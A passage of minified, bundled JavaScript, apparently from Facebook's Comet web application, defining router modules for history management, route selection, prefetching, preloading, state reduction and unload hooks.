                d("MWChatVideoAutoplaySettingContext")
                  .MWChatVideoAutoplaySettingContextProvider,
                { children: i.jsx(b("cr:764"), {}) }
              ),
            }),
          }),
        });
      }
      n.displayName = n.name + " [from " + f.id + "]";
      e = i.memo(a);
      g["default"] = e;
    },
    98
  );
  __d(
    "LoggedInFBAppshellEntrypoint",
    ["CometAppNavigationProfileSwitcherConfigQuery$Parameters", "WebPixelRatio"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      a = {
        getDeferredQueries: function () {
          return {};
        },
        getDisplayQueries: function () {
          var a = {
            profileSwitcherConfigQueryRef: {
              parameters: c(
                "CometAppNavigationProfileSwitcherConfigQuery$Parameters"
              ),
              variables: { scale: d("WebPixelRatio").get() },
            },
          };
          return a;
        },
      };
      b = a;
      g["default"] = b;
    },
    98
  );
  __d(
    "buildBaseCometRouterStateProvider",
    [
      "BaseEventEmitter",
      "CometPassiveGetRouterStateContext",
      "CometRouteStoreContext",
      "CometRouterDispatcherContext",
      "CometRouterFocusManager.react",
      "CometRouterLoadingContextInternals_DO_NOT_USE",
      "CometRouterMaintainedRoutesStateContext",
      "CometRouterPushViewStackContext",
      "CometRouterRouteTopNavTypeContext",
      "CometRouterStateContext",
      "CometRouterUIComponentContext",
      "ReactDOMComet",
      "getTopMostRoute",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react"));
      b = h;
      var j = b.useCallback,
        k = b.useEffect,
        l = b.useState,
        m = [];
      function a(a, b, e) {
        var f = new (c("BaseEventEmitter"))();
        return function (g) {
          var h = l(function () {
              return a.getCurrentRouterState();
            }),
            n = h[0],
            o = h[1];
          h = l(function () {
            return a.getMaintainedRouteState();
          });
          var p = h[0],
            q = h[1];
          h = b();
          var r = h[0];
          h = j(function (a) {
            var b = f.addListener("cometRouterLoadingStateChanged", a);
            return function () {
              return b.remove();
            };
          }, []);
          k(function () {
            var b = a.getCurrentRouterState(),
              c = a.getMaintainedRouteState();
            d("ReactDOMComet").unstable_batchedUpdates(function () {
              o(b), q(c);
            });
            var e = a.listen(function () {
                var b = a.getCurrentRouterState(),
                  c = a.getLoadingState(),
                  e = a.getMaintainedRouteState();
                d("ReactDOMComet").unstable_batchedUpdates(function () {
                  o(b), q(e), f.emit("cometRouterLoadingStateChanged", c, b);
                });
              }),
              g = a.setUnloadListener(function (a, b, c, d, e, f, g) {
                r({
                  body: f,
                  cancel: c,
                  confirm: a,
                  onCloseButtonPress: g,
                  primaryAction: b,
                  secondaryAction: d,
                  title: e,
                });
              });
            return function () {
              e.cancel(), g.cancel();
            };
          }, []);
          g = g.children;
          return i.jsx(c("CometRouterUIComponentContext").Provider, {
            value: e,
            children: i.jsx(c("CometRouterDispatcherContext").Provider, {
              value: a.dispatcher,
              children: i.jsx(
                c("CometRouterLoadingContextInternals_DO_NOT_USE").Provider,
                {
                  value: h,
                  children: i.jsx(c("CometRouterStateContext").Provider, {
                    value: n,
                    children: i.jsx(
                      c("CometPassiveGetRouterStateContext").Provider,
                      {
                        value: a.getCurrentRouterState,
                        children: i.jsx(
                          c("CometRouterMaintainedRoutesStateContext").Provider,
                          {
                            value: p,
                            children: i.jsx(
                              c("CometRouterPushViewStackContext").Provider,
                              {
                                value: (h = n.pushViewStack) != null ? h : m,
                                children: i.jsx(
                                  c("CometRouteStoreContext").Provider,
                                  {
                                    value: a.store,
                                    children: i.jsx(
                                      c("CometRouterRouteTopNavTypeContext")
                                        .Provider,
                                      {
                                        value:
                                          (p =
                                            c("getTopMostRoute")(n).topNavType) !=
                                          null
                                            ? p
                                            : "default",
                                        children: i.jsx(
                                          d("CometRouterFocusManager.react")
                                            .CometRouterFocusManager,
                                          {
                                            children:
                                              typeof g === "function" ? g(n) : g,
                                          }
                                        ),
                                      }
                                    ),
                                  }
                                ),
                              }
                            ),
                          }
                        ),
                      }
                    ),
                  }),
                }
              ),
            }),
          });
        };
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometHistoryManagerStack",
    ["cr:1618"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a, c, d) {
        var e = [];
        e.push({ params: a, routeStep: 0 });
        var f = function (a) {
          return { entry: e[a], index: a };
        };
        a = function () {
          return f(j());
        };
        var g = function () {
            return f(e.length - 1);
          },
          h = function () {
            return f(e.length - g().entry.routeStep - 1);
          };
        function i(a, b, c) {
          c === void 0 && (c = !1),
            e.splice(a),
            e.push({ params: b, routeStep: c ? g().entry.routeStep + 1 : 0 });
        }
        function j() {
          var a = c(),
            b = e.length;
          while (--b >= 0) if (d(e[b].params[0], a)) return b;
          i(e.length, [a, null, null]);
          return e.length - 1;
        }
        b("cr:1618") == null ? void 0 : b("cr:1618").registerHistoryStack(e);
        return {
          getCurrentEntry: a,
          getEntry: f,
          getLastStepZeroEntry: h,
          getTopEntry: g,
          pushAtIndex: i,
        };
      }
      g.createStack = a;
    },
    98
  );
  __d(
    "buildCometHistory",
    [],
    function (a, b, c, d, e, f) {
      "use strict";
      a = function (a, b) {
        var c = "auto",
          d = b;
        window.addEventListener("popstate", function () {
          d == null ? void 0 : d(window.location.href);
        });
        a = function (a, b) {
          window.history.pushState(a, null, b);
        };
        b = function (a) {
          window.history.go(a);
        };
        var e = function (a, b) {
            window.history.replaceState(a, null, b);
          },
          f = function () {
            return window.history.back();
          },
          g = function () {
            return window.history.forward();
          },
          h = function () {
            return window.history.length;
          },
          i = function () {
            return window.history.state;
          },
          j = function () {
            return "scrollRestoration" in window.history
              ? window.history.scrollRestoration
              : c;
          },
          k = function (a) {
            if ("scrollRestoration" in window.history) {
              window.history.scrollRestoration = a;
              return;
            }
            c = a;
          },
          l = function (a) {
            d = a;
          };
        f = {
          back: f,
          forward: g,
          getLength: h,
          getScrollRestoration: j,
          getState: i,
          go: b,
          pushState: a,
          replaceState: e,
          setOnNavigationHandler: l,
          setScrollRestoration: k,
        };
        return f;
      };
      b = a;
      f["default"] = b;
    },
    66
  );
  __d(
    "createRouteKey",
    [],
    function (a, b, c, d, e, f) {
      "use strict";
      function a() {
        return "state-key-" + Date.now();
      }
      f["default"] = a;
    },
    66
  );
  __d(
    "CometHistoryManager",
    ["CometHistoryManagerStack", "buildCometHistory", "createRouteKey"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function h(a, b, e, f, g, h) {
        var i = (h = h) != null ? h : c("buildCometHistory")();
        g != null &&
          i.setOnNavigationHandler(function (a) {
            p(function () {
              return g(a);
            });
          });
        var j = [],
          k = d("CometHistoryManagerStack").createStack(
            b,
            function () {
              return e(i);
            },
            f
          );
        i.setScrollRestoration(a.scrollRestorationBehavior);
        i.replaceState(b[0], b[2]);
        function l() {
          var a = j.splice(0, 1);
          a[0] == null ? void 0 : a[0]();
        }
        function m(a) {
          var b = k.getCurrentEntry().index;
          a = a - b;
          i.go(a);
        }
        function n(a, b) {
          k.getTopEntry().entry.routeStep > 0 &&
            b === !1 &&
            j.push(function () {
              return m(k.getLastStepZeroEntry().index);
            }),
            j.push(function () {
              var c = k.getCurrentEntry().index;
              k.pushAtIndex(c + 1, a, b);
              i.pushState(a[0], a[2]);
            }),
            l();
        }
        function o(a, b) {
          k.getTopEntry().entry.routeStep > 0 &&
            b === !1 &&
            j.push(function () {
              return m(k.getLastStepZeroEntry().index);
            }),
            j.push(function () {
              var c = k.getCurrentEntry().index;
              k.pushAtIndex(c, a, b);
              i.replaceState(a[0], a[2]);
            }),
            l();
        }
        function p(a) {
          if (j.length) return l();
          var b = k.getCurrentEntry(),
            c = k.getLastStepZeroEntry();
          b.index < c.index &&
            k.getTopEntry().entry.routeStep > 0 &&
            (j.push(function () {
              return m(c.index);
            }),
            j.push(function () {
              var a = [].concat(c.entry.params);
              a[2] = "#";
              k.pushAtIndex(c.index + 1, a, !0);
              i.pushState(a[0], a[2]);
              m(b.index);
            }));
          j.push(a);
          l();
        }
        function q() {
          return k.getCurrentEntry().entry.routeStep;
        }
        return {
          back: i.back,
          forward: i.forward,
          getCurrentRouteStep: q,
          getState: i.getState,
          go: i.go,
          pushState: n,
          replaceState: o,
        };
      }
      function i(a) {
        return (a = a.getState()) != null ? a : { key: c("createRouteKey")() };
      }
      function j(a, b) {
        return a.key === b.key;
      }
      function a(a, b, c, d) {
        return h(a, b, i, j, c, d);
      }
      g.createHistoryManager = a;
    },
    98
  );
  __d(
    "CometRouterMemoryUtils",
    ["MaintainedRouteConfig", "cr:1813330", "performance", "qex"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = (f = c("qex")._("13")) != null ? f : -1;
      function a(a) {
        var b;
        a = c("MaintainedRouteConfig")[a];
        a = a == null ? void 0 : a.maintainRouteWhenJSHeapBelow;
        return (
          a == null ||
          a <= 0 ||
          ((h || (h = c("performance"))) == null
            ? void 0
            : (b = (h || (h = c("performance"))).memory) == null
            ? void 0
            : b.usedJSHeapSize) <= a
        );
      }
      function d(a) {
        if (b("cr:1813330") != null) {
          var c;
          (c = b("cr:1813330")).setPreviousUri(document.URL);
          var d = c.getCurrentUsedJSHeapSize();
          c.setPreviousUsedJSHeapSize(d);
          c.setNavigationCount(a);
        }
      }
      function e(a, b) {
        if (a.polarisRouteConfig != null) {
          return i < 0
            ? !1
            : ((a =
                (h || (h = c("performance"))) == null
                  ? void 0
                  : (b = (h || (h = c("performance"))).memory) == null
                  ? void 0
                  : b.usedJSHeapSize) != null
                ? a
                : 0) >= i;
        }
        return !1;
      }
      f = {
        hasNoMemoryConcern: a,
        logNavigationCount: d,
        shouldRefreshDueToMemoryConcern: e,
      };
      g["default"] = f;
    },
    98
  );
  __d(
    "cometRouterAdjustExtraConfigForRoute",
    ["getTopMostRoute", "normalizeCometRouterUrl"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a, b, d, e, f) {
        f === void 0 && (f = !0);
        var g = c("getTopMostRoute")(e);
        g = c("normalizeCometRouterUrl")(g.url);
        var h = b.actorID;
        b = b.from;
        var i = d.replace || !1,
          j = d.target;
        a === g &&
          (f && (i = !0),
          e.pushViewStack != null && ((j = "self"), (b = "pushView")));
        return babelHelpers["extends"]({}, d, {
          dispatchedFrom: b,
          previousActorID: h,
          replace: i,
          target: j,
        });
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "cometRouterBuildErrorRouteState",
    ["CometProductAttribution", "buildCometErrorRoute"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a, b, e, f, g, h) {
        e = c("buildCometErrorRoute")(e, h);
        h = d("CometProductAttribution").getRouteInfoForDispatch(a, g);
        return {
          main: babelHelpers["extends"](
            {
              mutableState: {},
              productAttribution: h.productAttribution,
              route: e,
            },
            f
          ),
          routeKey: b,
        };
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "cometRouterCleanURLSearchParameters",
    [],
    function (a, b, c, d, e, f) {
      "use strict";
      var g = [
        "__cft__",
        "__tn__",
        "fnr_t",
        "sw_fnr_id",
        "__cmr",
        "_ps",
        "wtsid",
      ];
      function a(a, b) {
        b = b != null ? g.concat(b) : g;
        return a.removeQueryParams(b);
      }
      f["default"] = a;
    },
    66
  );
  __d(
    "cometRouterCreatePersistentParamsManager",
    ["ConstUriUtils"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a) {
        var b = {};
        return {
          getUrlWithPersistentParams: function (a) {
            if (Object.keys(b).length === 0) return a;
            var c = d("ConstUriUtils").getUri(a);
            if (c == null) return a;
            c = c.addQueryParams(new Map(Object.entries(b)));
            return c == null ? a : c.toString();
          },
          setPersistentParams: function (c) {
            var d = c.getQueryParams();
            b = {};
            a.forEach(function (a) {
              if (a === "sk") return;
              if (d.has(a)) {
                var c = d.get(a);
                b[a] = c;
              }
            });
          },
        };
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "cometRouterIsNavigationRefresh",
    [
      "ConstUriUtils",
      "cometRouterCleanURLSearchParameters",
      "getTopMostRoute",
      "normalizeCometRouterUrl",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a, b) {
        b = c("getTopMostRoute")(b);
        var e = d("ConstUriUtils").getUri(b.url),
          f = d("ConstUriUtils").getUri(a.url);
        if (e == null || f == null) return !1;
        e = c("normalizeCometRouterUrl")(
          (e =
            (e = c("cometRouterCleanURLSearchParameters")(e)) == null
              ? void 0
              : e.toString()) != null
            ? e
            : b.url
        );
        b = c("normalizeCometRouterUrl")(
          (f =
            (b = c("cometRouterCleanURLSearchParameters")(f)) == null
              ? void 0
              : b.toString()) != null
            ? f
            : a.url
        );
        return e === b;
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "cometRouterNavigateOnWindow",
    [
      "ConstUriUtils",
      "ODS",
      "Random",
      "gkx",
      "goForceFullPageRedirectTo",
      "isLinkshimURI",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = ["/ads", "/help"];
      function j(a) {
        switch (a) {
          case "unmatched":
            return 364;
          case "history_back_failed":
            return 309;
          case "navigation_limit":
            return 59;
          case "session_time_limit":
            return 27;
          case "404":
            return 11;
          default:
            return 1;
        }
      }
      function a(a, b, e) {
        var f = d("ConstUriUtils").getUri(a);
        if (f && !c("isLinkshimURI")(f)) {
          if (
            !i.some(function (b) {
              return a.startsWith(b);
            })
          ) {
            f = j(b);
            d("Random").coinflip(f) &&
              (h || (h = d("ODS"))).bumpEntityKey(
                2994,
                "comet_router",
                "force_reload." + b,
                f
              );
          }
          c("gkx")("4527") && alert("Reloading page due to " + b);
          c("goForceFullPageRedirectTo")(a, e);
        }
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "cometRouterNotifyServer",
    [
      "FBLogger",
      "buildCometErrorRoute",
      "cometRouterNavigateOnWindow",
      "promiseDone",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a, b, d, e, f, g, h) {
        c("promiseDone")(
          g.fetchForValidation(b, a, d, h),
          function (a) {
            if (e() || a == null) return;
            return a.type !== "valid_route"
              ? c("cometRouterNavigateOnWindow")(a.url, "unmatched", !0)
              : f(a);
          },
          function (b) {
            if (b.errorRawTransportStatus === 404 || b.errorType === "HTTP 404")
              return c("cometRouterNavigateOnWindow")(a, "404", !0);
            c("FBLogger")("CometRouter")
              .catching(b)
              .warn(
                'Error notifying server on navigation: type="' +
                  b.errorType +
                  '" msg="' +
                  b.errorMsg +
                  '" code="' +
                  b.code +
                  '" statusCode="' +
                  b.errorRawTransportStatus +
                  '"'
              );
            return f(c("buildCometErrorRoute")(a, h));
          }
        );
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "getSecondTopViewInfo",
    [],
    function (a, b, c, d, e, f) {
      "use strict";
      function a(a) {
        var b,
          c = a.hosted,
          d = a.main;
        a = a.pushViewStack;
        return a == null || a.length === 0
          ? null
          : {
              routeInfo:
                a.length === 1 ? ((b = c) != null ? b : d) : a[a.length - 2],
              viewType: a.length > 1 ? "push" : c != null ? "hosted" : "main",
            };
      }
      f["default"] = a;
    },
    66
  );
  __d(
    "isPushViewRouteType",
    [],
    function (a, b, c, d, e, f) {
      "use strict";
      var g = new Set([
        "media_viewer",
        "scoped_search",
        "creation_flow",
        "full_width_modal",
        "routable_dialog",
      ]);
      function a(a) {
        return a != null && g.has(a);
      }
      f["default"] = a;
    },
    66
  );
  __d(
    "cometRouterSelectNavigation",
    [
      "getSecondTopViewInfo",
      "getTopMostRoute",
      "isPushViewRouteType",
      "recoverableViolation",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function h(a) {
        return a.pushViewStack && a.pushViewStack.length
          ? a.pushViewStack[a.pushViewStack.length - 1]
          : a.main;
      }
      function i(a, b, d, e, f) {
        var g = c("isPushViewRouteType")(a.routeType);
        if (d === "content")
          if (e.isCometRootContainer !== !0) {
            var h;
            c("recoverableViolation")(
              "Asked for a target content but the current view isn't a container. From URL: " +
                e.url +
                " trace policy: " +
                ((h = e.tracePolicy) != null ? h : "") +
                ", To: " +
                a.url +
                " trace policy: " +
                ((h = a.tracePolicy) != null ? h : ""),
              "comet_infra"
            );
          } else if (!a.hostableView) {
            c("recoverableViolation")(
              "Asked for a target content but the to route doesnt support a content view. From URL: " +
                e.url +
                " trace policy: " +
                ((h = e.tracePolicy) != null ? h : "") +
                ", To: " +
                a.url +
                " trace policy: " +
                ((e = a.tracePolicy) != null ? e : ""),
              "comet_infra"
            );
          } else
            return {
              action: "loadHosted",
              target: { route: a, view: a.hostableView },
            };
        else if (d === "self")
          if (b === "hostedView")
            return {
              action: "loadHosted",
              target: { route: a, view: a.hostableView },
            };
          else if (b === "pushView" && g)
            return {
              action: "replacePushView",
              target: { route: a, view: a.rootView },
            };
          else
            return { action: "loadTab", target: { route: a, view: a.rootView } };
        if (g) {
          if (a.replacePushViewOfSameTracePolicy === !0 && f.pushViewStack) {
            h = f.pushViewStack[f.pushViewStack.length - 1];
            if ((h == null ? void 0 : h.route.tracePolicy) === a.tracePolicy)
              return {
                action: "replacePushView",
                target: { route: a, view: a.rootView },
              };
          }
          return {
            action: "addPushView",
            target: { route: a, view: a.rootView },
          };
        } else
          return { action: "loadTab", target: { route: a, view: a.rootView } };
      }
      function a(a, b, d, e, f, g) {
        var j = h(e);
        j = j.route;
        var k = a.backgroundRouteConfig,
          l = k == null ? void 0 : k.allowedTracePolicies,
          m = b;
        b == null &&
          a.routeType === "routable_dialog" &&
          j.routeType === "routable_dialog" &&
          (m = g);
        g = i(a, (b = d) != null ? b : "rootView", m, j, e);
        if (k == null || l == null) return g;
        d = k.defaultBackgroundUrl;
        var n;
        switch (g.action) {
          case "addPushView":
          case "loadHosted":
            n = (b = c("getTopMostRoute")(e)) == null ? void 0 : b.tracePolicy;
            break;
          case "replacePushView":
            n =
              (m = c("getSecondTopViewInfo")(e)) == null
                ? void 0
                : (k = m.routeInfo) == null
                ? void 0
                : (b = k.route) == null
                ? void 0
                : b.tracePolicy;
            break;
        }
        if (n != null && l.includes(n)) return g;
        e = f.getRoute(d);
        if (e == null || (e == null ? void 0 : e.type) !== "valid_route") {
          c("recoverableViolation")(
            "Background Route is not been fetched successfully. From URL: " +
              j.url +
              " trace policy: " +
              ((m = j.tracePolicy) != null ? m : "") +
              ", To: " +
              a.url +
              "  trace policy: " +
              ((k = a.tracePolicy) != null ? k : "") +
              ", with default background URL: " +
              d,
            "comet_infra"
          );
          return { action: "loadTab", target: { route: a, view: a.rootView } };
        }
        return {
          action: "loadTab",
          modal: { route: a, view: a.rootView },
          target: { route: e, view: e.rootView },
        };
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "cometRouterPrefetchRouteQueries",
    [
      "Bootloader",
      "cometRouterAdjustExtraConfigForRoute",
      "cometRouterIsNavigationRefresh",
      "cometRouterSelectNavigation",
      "normalizeCometRouterUrl",
      "promiseDone",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a, b, d, e, f, g, h, i, j, k) {
        b === void 0 && (b = { replace: !1 });
        var l = !1,
          m = c("normalizeCometRouterUrl")(a),
          n = f();
        d = (d = d) != null ? d : h.getRoute(a);
        if (d) o(d);
        else {
          d = e.actorID;
          c("promiseDone")(h.fetchForNavigation(m, d, null, k), function (a) {
            var b = a.route;
            o(b, a.initialTimeSpentMetaData);
          });
        }
        function o(d, k) {
          k === void 0 && (k = null);
          if (d.type !== "valid_route") return;
          d = d;
          if (l) return;
          var m = c("cometRouterAdjustExtraConfigForRoute")(a, e, b, f()),
            o = m.passthroughProps,
            p = m.previousActorID,
            q = m.target,
            r = c("cometRouterIsNavigationRefresh")(d, f());
          if (r) return;
          r = c("cometRouterSelectNavigation")(d, q, m.dispatchedFrom, n, h);
          r.target.view &&
            (i(d, r.target.view, k, o, p, j, g), c("Bootloader").forceFlush());
        }
        return {
          cancel: function () {
            if (l) return;
            l = !0;
          },
          usePrefetchedEntrypointForRouting: function () {},
        };
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "cometRouterPreloadEntrypoint",
    [
      "Bootloader",
      "createCometRelayBaseEntryPointEnvironmentProvider",
      "getCometRouteActor",
      "gkx",
      "react-relay/relay-hooks/prepareEntryPoint_DEPRECATED",
      "requireDeferred",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h = c("requireDeferred")("CometRelayEF").__setRef(
          "cometRouterPreloadEntrypoint"
        ),
        i = new Set(["has_profile_session_id"]);
      function a(a, b, d, e, f, g, j) {
        var k = a.params,
          l = a.timeSpentConfig;
        if (
          l != null &&
          d == null &&
          (!c("gkx")("5205") ||
            Object.keys(l).some(function (a) {
              return !i.has(a);
            }))
        )
          return;
        l = b.entryPoint;
        if (l == null) return;
        if (a.tabKey != null && j[a.tabKey] != null) return;
        j = c("getCometRouteActor")(a, f);
        var m = c("createCometRelayBaseEntryPointEnvironmentProvider")(g, j);
        a = l.getModuleIfRequireable();
        function n(a) {
          var f = {
            passthroughProps: e,
            routeParams: k,
            routeProps: b.props,
            timeSpentMetaData: d,
          };
          c("react-relay/relay-hooks/prepareEntryPoint_DEPRECATED")(m, a, f);
          var g = h.getModuleIfRequireable();
          g && g.fetchPredictedResources(a, f);
        }
        a
          ? n(a)
          : l.onReady(function (a) {
              n(a), c("Bootloader").forceFlush();
            });
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "cometRouterPreloadRouteCode",
    [
      "Bootloader",
      "Run",
      "cometRouterSelectNavigation",
      "normalizeCometRouterUrl",
      "promiseDone",
      "requireDeferred",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h = c("requireDeferred")("CometRelayEF").__setRef(
        "cometRouterPreloadRouteCode"
      );
      function i(a, b) {
        var c = b == null ? void 0 : b.entryPoint;
        if (b == null || a == null || c == null) return;
        function d(c) {
          var d = h.getModuleIfRequireable();
          if (d) {
            var e = { routeParams: a.params, routeProps: b.props };
            d.fetchPredictions(c, e);
          }
        }
        var e = c.getModuleIfRequireable();
        e ? d(e) : c.onReady(d);
      }
      function a(a, b, e, f, g, h) {
        a = c("normalizeCometRouterUrl")(a);
        c("promiseDone")(g.fetchRoute(a, h), function (a) {
          if (a.type === "valid_route" && a.tracePolicy !== "comet.error") {
            a = c("cometRouterSelectNavigation")(a, b, e.from, f, g);
            var h = a.target,
              j = h.route;
            h = h.view;
            a = (a = a.modal) != null ? a : {};
            var k = a.route;
            a = a.view;
            if (h && h.allResources) {
              var l = h.allResources;
              a && a.allResources && (l = l.concat(a.allResources));
              d("Run").onAfterLoad(function () {
                l.forEach(function (a) {
                  a.preload();
                }),
                  c("Bootloader").forceFlush();
              });
              i(j, h);
              i(k, a);
            }
          }
        });
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "cometRouterReducer",
    ["CometProductAttribution", "unrecoverableViolation", "uuidv4"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function h(a, b, d) {
        return babelHelpers["extends"]({}, b, {
          depth: 1,
          key: "pushView-key-" + c("uuidv4")(),
          mutableState: {},
          productAttribution: d,
          route: a,
        });
      }
      function i(a, b, c, d, e) {
        b = h(b, d, e);
        d = c.main;
        e = c.pushViewStack;
        return babelHelpers["extends"]({}, c, {
          main: d,
          pushViewStack: (e || []).concat(b),
          routeKey: a,
        });
      }
      function j(a, b, c, d, e, f) {
        var g = c.pushViewStack != null ? [].concat(c.pushViewStack) : [],
          i = !!g.length;
        if (i) {
          i = g[g.length - 1];
          g[g.length - 1] = babelHelpers["extends"]({}, e, {
            depth: d ? i.depth : i.depth + 1,
            key: i.key,
            mutableState: {},
            productAttribution: f,
            route: b,
          });
        } else g.push(h(b, e, f));
        return babelHelpers["extends"]({}, c, { pushViewStack: g, routeKey: a });
      }
      function k(a) {
        return a.pushViewStack && a.pushViewStack.length
          ? a.pushViewStack[a.pushViewStack.length - 1]
          : a.main;
      }
      function l(a, b, d, e, f) {
        var g = k(d).route;
        if (g.isCometRootContainer !== !0)
          throw c("unrecoverableViolation")(
            "Tried to load a content view into a non-root",
            "comet_infra"
          );
        g = b.hostableView;
        if (!g)
          throw c("unrecoverableViolation")(
            "Tried to load a content route without a contentView",
            "comet_infra"
          );
        return babelHelpers["extends"]({}, d, {
          hosted: babelHelpers["extends"]({}, e, {
            mutableState: {},
            productAttribution: f,
            route: b,
          }),
          routeKey: a,
        });
      }
      function m(a, b, c, d) {
        return {
          main: babelHelpers["extends"]({}, c, {
            mutableState: {},
            productAttribution: d,
            route: b,
          }),
          routeKey: a,
        };
      }
      function n(a, b, c, e, f) {
        b = d("CometProductAttribution").getRouteInfoForDispatch(b, f);
        f = b.productAttribution;
        e = (e = e) != null ? e : {};
        var g = e.fromLink,
          h = e.linkContext,
          i = e.navChainContent;
        e = e.trackingNodes;
        a = d("CometProductAttribution").getProductAttributionFromRoute(
          a,
          g,
          b,
          h,
          e,
          c,
          i
        );
        (g == null || h == null) &&
          (a = babelHelpers["extends"]({}, a, {
            0: f == null ? void 0 : f["0"],
          }));
        return a;
      }
      function a(a, b, d) {
        var e = d.payload,
          f = e.dispatchedFrom,
          g = e.productAttributionUpdateProps,
          h = e.routeInfoExtras,
          k = e.to;
        e = e.wasHistoryReplaced;
        g = n(k, b, e, g, f);
        switch (d.__type) {
          case "loadHosted":
            return l(a, k, b, h, g);
          case "replacePushView":
            return j(a, k, b, e, h, g);
          case "addPushView":
            return i(a, k, b, h, g);
          case "loadTab":
            return m(a, k, h, g);
          default:
            throw c("unrecoverableViolation")(
              "Invalid action passed to cometRouterReducer: " + d.__type + "}",
              "comet_infra"
            );
        }
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "cometRouterSetOriginalReferrerWithNavigationType",
    ["getTopMostRouteInfo"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a, b, d, e) {
        var f,
          g = b.hosted,
          h = b.pushViewStack,
          i = b.main;
        i = babelHelpers["extends"]({}, i, e);
        e = {
          actorID: a.actorID,
          isBackgroundRoute: !1,
          tracePolicy: a.tracePolicy,
          url: a.url,
        };
        a = c("getTopMostRouteInfo")(b).referrer;
        f =
          (f = a == null ? void 0 : a.originalReferrer) != null
            ? f
            : {
                actorID: a == null ? void 0 : a.actorID,
                isBackgroundRoute: a == null ? void 0 : a.isBackgroundRoute,
                navigationType: a == null ? void 0 : a.navigationType,
                tracePolicy: a == null ? void 0 : a.tracePolicy,
                url: a == null ? void 0 : a.url,
              };
        a = babelHelpers["extends"]({}, e, {
          navigationType: d,
          originalReferrer: f,
        });
        if (h != null && h.length > 0) {
          e = [].concat(h);
          e[h.length - 1] = babelHelpers["extends"]({}, h[h.length - 1], {
            referrer: a,
          });
          return babelHelpers["extends"]({}, b, { main: i, pushViewStack: e });
        } else if (g != null)
          return babelHelpers["extends"]({}, b, {
            hosted: babelHelpers["extends"]({}, g, { referrer: a }),
            main: i,
          });
        else
          return babelHelpers["extends"]({}, b, {
            main: babelHelpers["extends"]({}, i, { referrer: a }),
          });
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "cometRouterSetOriginalReferrerWithNavigationTypeAndInteraction",
    ["CometHeroLogging", "cometRouterSetOriginalReferrerWithNavigationType"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a, b, d) {
        return c("cometRouterSetOriginalReferrerWithNavigationType")(a, b, d, {
          navigationInteractionID:
            c("CometHeroLogging").genHeroInteractionUUIDAndMarkStart(),
        });
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "cometRouterUnloadHookUtils",
    ["getTopMostRoute", "gkx"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function h(a, b, c) {
        for (var d = 0; d < a.length; d++) {
          var e = a[d];
          e = e(b);
          if (e != null && c !== !0) return e;
        }
      }
      function i(a) {
        if (a == null) return;
        if (a.pushViewStack != null && a.pushViewStack.length) {
          var b = a.pushViewStack[a.pushViewStack.length - 1];
          b = h(b.mutableState.unloadHooks || []);
          if (b != null) return b;
          return;
        }
        if ((b = a.hosted) == null ? void 0 : b.mutableState.unloadHooks) {
          b = h(
            ((b = a.hosted) == null ? void 0 : b.mutableState.unloadHooks) || []
          );
          if (b != null) return b;
        }
        if (
          a.main.mutableState.unloadHooks &&
          a.main.mutableState.unloadHooks.length
        ) {
          b = h(a.main.mutableState.unloadHooks);
          if (b != null) return b;
        }
      }
      function a(a, b, d) {
        var e = c("getTopMostRoute")(b),
          f = a.pushViewStack || [],
          g = b.pushViewStack || [];
        if (f.length) {
          var i = f[f.length - 1],
            j = i.route;
          i = i.mutableState.unloadHooks;
          if (
            i != null &&
            i.length &&
            (f.length !== g.length || j !== g[g.length - 1].route)
          ) {
            j = h(i, e, d);
            if (j != null) return j;
          }
          return;
        }
        if (
          ((i = a.hosted) == null
            ? void 0
            : (j = i.mutableState.unloadHooks) == null
            ? void 0
            : j.length) &&
          ((i = a.hosted) == null ? void 0 : i.route) !==
            ((j = b.hosted) == null ? void 0 : j.route)
        ) {
          j = h(
            ((i = a.hosted) == null ? void 0 : i.mutableState.unloadHooks) || [],
            e,
            d
          );
          if (j != null) return j;
        }
        if (
          a.main.mutableState.unloadHooks &&
          a.main.mutableState.unloadHooks.length &&
          (f.length < g.length || a.main.route !== b.main.route)
        ) {
          i = h(a.main.mutableState.unloadHooks, e, d);
          j = !g.length || g[g.length - 1].route.routeType !== "media_viewer";
          if (i != null && (!c("gkx")("5574") || (c("gkx")("5574") && j)))
            return i;
        }
      }
      function b(a) {
        return function (b) {
          var c = i(a());
          if (c != null) {
            b.preventDefault();
            b.returnValue = c.warnMessage;
            return c.warnMessage;
          }
        };
      }
      g.runUnloadHooks = a;
      g.createOnBeforeUnloadEventHandler = b;
    },
    98
  );
  __d(
    "currentCometRouterInstance",
    ["FBLogger"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h = null;
      function a() {
        h == null &&
          c("FBLogger")("CometRouter").warn(
            "Something attempted to access the Comet router before it was initialized."
          );
        return h;
      }
      function b(a) {
